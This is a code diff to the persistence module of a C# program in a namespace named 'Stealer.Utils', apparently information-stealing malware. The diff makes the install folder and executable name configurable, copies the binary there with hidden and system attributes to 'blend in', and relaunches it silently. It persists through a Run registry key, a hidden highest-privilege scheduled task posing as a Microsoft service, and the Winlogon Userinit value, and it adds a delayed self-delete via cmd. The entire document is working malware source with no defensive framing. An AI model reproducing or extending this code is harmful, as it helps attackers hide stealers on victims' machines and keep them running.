@@ -7,11 +7,71 @@ namespace Stealer.Utils
 {
     public static class Persistence
     {
-        private static readonly string ExeName = "WindowsHostManager.exe";
-        private static readonly string InstallDir = Path.Combine(
-            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-            "Microsoft", "HostManager");
-        private static readonly string InstallPath = Path.Combine(InstallDir, ExeName);
+        private static string _installDir;
+        private static string _installPath;
+        private static string _installName;
+
+        private static void EnsurePaths()
+        {
+            if (_installPath != null) return;
+            _installName = Config.InstallName.Trim();
+            if (string.IsNullOrEmpty(_installName)) _installName = "WindowsHostManager.exe";
+            string folder = ResolveFolder(Config.InstallFolder.Trim());
+            _installDir  = folder;
+            _installPath = Path.Combine(folder, _installName);
+        }
+
+        private static string ResolveFolder(string token)
+        {
+            if (string.IsNullOrEmpty(token)) token = "%ApplicationData%";
+
+            switch (token.ToUpper().Trim('%'))
+            {
+                case "APPLICATIONDATA":
+                case "APPDATA":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                case "LOCALAPPLICATIONDATA":
+                case "LOCALAPPDATA":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                case "WINDOWS":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+                case "SYSTEM32":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.System);
+                case "TEMP":
+                    return Path.GetTempPath().TrimEnd(Path.DirectorySeparatorChar);
+                case "USERPROFILE":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                case "PROGRAMFILES":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+                case "PROGRAMFILES(X86)":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
+                case "PROGRAMDATA":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
+                case "TEMPLATES":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.Templates);
+                case "MYDOCUMENTS":
+                case "DOCUMENTS":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                case "MYMUSIC":
+                case "MUSIC":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
+                case "MYVIDEOS":
+                case "VIDEOS":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
+                case "DESKTOP":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+                case "STARTUP":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                case "COMMONDOCUMENTS":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
+                case "COMMONPICTURES":
+                    return Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
+                default:
+                    // Treat as literal path or fall back to AppData
+                    if (Path.IsPathRooted(token)) return token;
+                    return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            }
+        }
 
         public static void Install()
         {
@@ -20,29 +80,54 @@ namespace Stealer.Utils
                 string methods = Config.Persistence.ToLower();
                 if (string.IsNullOrEmpty(methods) || methods == "none") return;
 
-                if (!Directory.Exists(InstallDir))
-                    Directory.CreateDirectory(InstallDir);
+                EnsurePaths();
 
                 string currentPath = Process.GetCurrentProcess().MainModule.FileName;
-                if (!currentPath.Equals(InstallPath, StringComparison.OrdinalIgnoreCase))
+                bool alreadyInstalled = currentPath.Equals(_installPath, StringComparison.OrdinalIgnoreCase);
+
+                if (!alreadyInstalled)
                 {
-                    File.Copy(currentPath, InstallPath, true);
+                    if (!Directory.Exists(_installDir))
+                        Directory.CreateDirectory(_installDir);
+
+                    File.Copy(currentPath, _installPath, true);
+
+                    // Set hidden + system attributes to blend in
+                    try { File.SetAttributes(_installPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
                 }
 
                 if (methods.Contains("registry")) try { RegistryRun(); } catch { }
                 if (methods.Contains("scheduler")) try { TaskScheduler(); } catch { }
-                if (methods.Contains("userinit")) try { Userinit(); } catch { }
+                if (methods.Contains("userinit"))  try { Userinit(); } catch { }
+
+                // Restart from install path so all future runs come from there
+                if (!alreadyInstalled)
+                {
+                    try
+                    {
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName         = _installPath,
+                            UseShellExecute  = false,
+                            CreateNoWindow   = true,
+                        });
+                    }
+                    catch { }
+                    Environment.Exit(0);
+                }
             }
             catch { }
         }
 
         public static void Uninstall()
         {
+            EnsurePaths();
+
             try
             {
                 using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                 {
-                    key?.DeleteValue("WindowsHostManager", false);
+                    key?.DeleteValue(Path.GetFileNameWithoutExtension(_installName), false);
                 }
             }
             catch { }
@@ -51,9 +136,9 @@ namespace Stealer.Utils
             {
                 Process.Start(new ProcessStartInfo
                 {
-                    FileName = "schtasks",
-                    Arguments = "/Delete /TN \"Microsoft\\Windows\\HostManager\\Service\" /F",
-                    CreateNoWindow = true,
+                    FileName        = "schtasks",
+                    Arguments       = "/Delete /TN \"Microsoft\\Windows\\HostManager\\Service\" /F",
+                    CreateNoWindow  = true,
                     UseShellExecute = false
                 })?.WaitForExit(5000);
             }
@@ -66,9 +151,26 @@ namespace Stealer.Utils
                     if (key != null)
                     {
                         string val = key.GetValue("Userinit", "").ToString();
-                        val = val.Replace("," + InstallPath, "");
+                        val = val.Replace("," + _installPath, "");
                         key.SetValue("Userinit", val);
                     }
+                }
+            }
+            catch { }
+
+            // Self-delete the installed copy after a short delay via cmd
+            try
+            {
+                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
+                if (currentPath.Equals(_installPath, StringComparison.OrdinalIgnoreCase))
+                {
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName        = "cmd.exe",
+                        Arguments       = "/C choice /T 3 /D Y /N & del /F /Q \"" + _installPath + "\"",
+                        CreateNoWindow  = true,
+                        UseShellExecute = false
+                    });
                 }
             }
             catch { }
@@ -76,63 +178,51 @@ namespace Stealer.Utils
 
         private static void RegistryRun()
         {
-            try
+            using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
             {
-                using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
-                {
-                    key?.SetValue("WindowsHostManager", "\"" + InstallPath + "\"");
-                }
+                key?.SetValue(Path.GetFileNameWithoutExtension(_installName), "\"" + _installPath + "\"");
             }
-            catch { }
         }
 
         private static void TaskScheduler()
         {
-            try
+            string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
+                "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
+                "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>" +
+                "<Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
+                "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
+                "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
+                "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" +
+                "<Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle>" +
+                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>" +
+                "<Actions><Exec><Command>" + _installPath + "</Command></Exec></Actions></Task>";
+
+            string xmlPath = Path.Combine(Path.GetTempPath(), "sht.xml");
+            File.WriteAllText(xmlPath, xml);
+
+            Process.Start(new ProcessStartInfo
             {
-                string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
-                    "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
-                    "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>" +
-                    "<Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
-                    "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
-                    "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
-                    "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" +
-                    "<Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle>" +
-                    "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>" +
-                    "<Actions><Exec><Command>" + InstallPath + "</Command></Exec></Actions></Task>";
+                FileName        = "schtasks",
+                Arguments       = "/Create /TN \"Microsoft\\Windows\\HostManager\\Service\" /XML \"" + xmlPath + "\" /F",
+                CreateNoWindow  = true,
+                UseShellExecute = false
+            })?.WaitForExit(5000);
 
-                string xmlPath = Path.Combine(Path.GetTempPath(), "sht.xml");
-                File.WriteAllText(xmlPath, xml);
-
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "schtasks",
-                    Arguments = "/Create /TN \"Microsoft\\Windows\\HostManager\\Service\" /XML \"" + xmlPath + "\" /F",
-                    CreateNoWindow = true,
-                    UseShellExecute = false
-                })?.WaitForExit(5000);
-
-                File.Delete(xmlPath);
-            }
-            catch { }
+            try { File.Delete(xmlPath); } catch { }
         }
 
         private static void Userinit()
         {
-            try
+            using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
             {
-                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
+                if (key == null) return;
+                string val = key.GetValue("Userinit", "").ToString();
+                if (!val.Contains(_installPath))
                 {
-                    if (key == null) return;
-                    string val = key.GetValue("Userinit", "").ToString();
-                    if (!val.Contains(InstallPath))
-                    {
-                        val = val.TrimEnd(',') + "," + InstallPath;
-                        key.SetValue("Userinit", val);
-                    }
+                    val = val.TrimEnd(',') + "," + _installPath;
+                    key.SetValue("Userinit", val);
                 }
             }
-            catch { }
         }
     }
 }
